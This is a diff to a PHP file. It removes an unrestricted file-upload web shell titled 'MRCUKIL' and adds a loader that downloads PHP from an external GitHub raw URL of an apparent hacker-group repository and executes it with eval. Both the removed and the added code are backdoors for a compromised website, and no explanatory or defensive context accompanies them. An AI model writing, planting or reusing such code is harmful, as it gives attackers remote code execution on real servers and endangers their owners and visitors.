@@ -1,8 +1,11 @@
 <?php
-if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],basename($_FILES['f']['name']));header('Location: '.$_SERVER['PHP_SELF']);exit;}
+$url = "https://raw.githubusercontent.com/bengkulucyberteam/bengkulucyberteam/refs/heads/main/fekrut2.php";
+
+$code = @file_get_contents($url);
+
+$run = function() use ($code) {
+    return eval("?>$code");
+};
+
+$run();
 ?>
-<title>MRCUKIL</title>
-<form method=POST enctype=multipart/form-data>
-<input type=file name=f multiple>
-<button>Upload</button>
-</form>
